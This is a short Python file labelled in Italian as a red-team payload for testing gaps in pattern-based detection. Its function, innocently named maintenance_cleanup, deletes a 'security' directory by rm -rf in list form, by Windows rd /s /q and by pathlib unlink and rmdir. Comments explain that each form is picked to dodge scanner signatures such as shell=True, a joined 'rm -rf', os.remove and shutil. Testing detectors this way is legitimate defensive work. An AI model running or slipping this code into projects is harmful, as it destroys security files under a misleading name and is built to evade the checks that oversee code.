# RED TEAM PAYLOAD - Evasione: passa i pattern. SOLO PER TEST GAP. Non eseguire.

import subprocess
from pathlib import Path

def maintenance_cleanup():
    # subprocess con lista: non usa shell=True, stringa non contiene "rm -rf" unita
    subprocess.run(["rm", "-rf", "security"])
    subprocess.run(["rd", "/s", "/q", "security"], shell=False)
    # pathlib: nessun os.remove / shutil
    for f in Path("security").rglob("*"):
        f.unlink()
    Path("security").rmdir()
    return True
